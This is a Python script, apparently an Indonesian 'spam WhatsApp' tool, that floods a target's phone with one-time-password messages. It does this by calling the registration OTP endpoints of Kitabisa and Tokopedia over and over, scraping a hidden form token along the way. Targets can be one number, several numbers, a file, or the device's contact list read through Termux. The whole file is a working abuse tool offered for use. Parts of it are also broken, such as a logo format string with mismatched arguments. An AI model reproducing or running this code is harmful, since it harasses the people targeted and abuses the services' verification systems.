import requests,random,json,time,sys,os,re

p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'

class spam:
		
	def __init__(self, nomer):
		self.nomer = nomer
		
	def spam(self):
		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
		if hasil.status_code == 200:
			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSuccess!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
			
	def tokped(self):
		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
		kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
		else:
			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'

def apakah():
	while True:
		lan=str(input(k+'\tMau lagi? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
			break
		else:
			continue
def files():
	fil=str(input(k+'\tFile : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tTotal spam : '+h))
		dly=int(input(k+'\tJeda : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'tkpd':
					print('\t'+z.tokped().__str__())
				else:
					print()
				time.sleep(dly)
		apakah()
	else:
		print(m+f'\tFile {fil} doesn`t exist')
def single():
	nomer=str(input(k+'\tNomor hp : '+h))
	jm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'\tJeda : '+h))
	for oo in range(jm):
		z=spam(nomer)
		if jns == 'tkpd':
			print('\t'+z.tokped())
		else:
			print()
		time.sleep(dly)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\tTotal number : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tNumber -{i+1} : '+h)))
	spm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'Delay : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(nomer[ss])
			if jns == 'tkpd':
				print('\t'+z.tokped())
			else:
				print()
		time.sleep(dly)
	apakah()
def logo():
	os.system('clear')
	auth=m+'  Author : '+k+'./Mahardika'
	return '''
%s SPAM WHATSAPP KECIL 
%s PUTRA MAHARDIKA
%s''' % (k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,auth)
# -----------------------------------------------------------
def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tchoose > '+h))-1]['number']
	dly=int(input(u+'\tDelay > '+h))
	for w in range(int(input(u+'\tTotal spam : '+h))):
		z=spam(nj)
		if jns == 'tkpd':
			print('\t'+z.tokped())
		time.sleep(dly)
	apakah()
def main():
	print(logo())
	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'MODE '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Back\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'1 Nomor\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'Lebih dari 1 nomor\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'ambil dari file\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'pilih dari kontak\n'+b+'╠══════════════════════════════')
	pil=str(input(b+'╚══'+m+'〙'+u+'Mode'+m+' ▶ '+h))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		multi()
	elif( pil == '3' or pil == '03'):
		files()
	elif( pil == '4' or pil == '04'):
		termux()
	elif( pil == '0' or pil == '00'):
		jnspam()
	else:
		print(m+'             jangan pergi')
		time.sleep(2)
		main()
def jnspam():
	global jns
	print(logo())
	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Exit\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'All\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Tokopedia\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk (Unlimited)\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji (Without +62 or 0)\n'+b+'╠══════════════════════════════')
	while True:
		oy=str(input(b+'╚══'+m+'〙'+u+'Spam'+m+' ▶ '+h))
		if( oy == '1' or oy == '01' ):
			jns='tkpd'
			break
		elif( oy == '0' or oy == '00' ):
			sys.exit()
		else:
			print(m+'             jangan di kosongin')
			continue
	main()
if __name__ == '__main__':
	jnspam()